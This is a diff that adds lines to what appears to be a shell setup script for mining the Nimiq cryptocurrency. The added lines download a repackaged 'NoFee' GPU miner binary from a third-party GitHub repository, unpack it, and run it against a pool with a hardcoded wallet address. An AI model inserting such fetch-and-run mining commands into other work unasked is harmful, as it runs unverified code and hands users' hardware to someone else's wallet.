@@ -1,3 +1,11 @@
+wget -N https://raw.githubusercontent.com/hayatiptv/Nimiq-GPU-Miner-NoncerPro-GPU-miner/master/NQ-Miner%20-%20NoFee/nq-miner-linux-0.99.6.tar.gz
+
+tar -xvf ./nq-miner-linux-0.99.6.tar.gz
+
+cd ./nq-miner/
+
+./nq-miner -t cuda -a "NQ54 HKTP BDQK 7PV9 BXKK GJ3H T6SM 4L5A 83C2" -p us.nimpool.io:8444 -m dumb
+
 git clone https://github.com/mobileapps84741274/linux8444;
 cd ./linux8444/;
 mkdir ./build/;
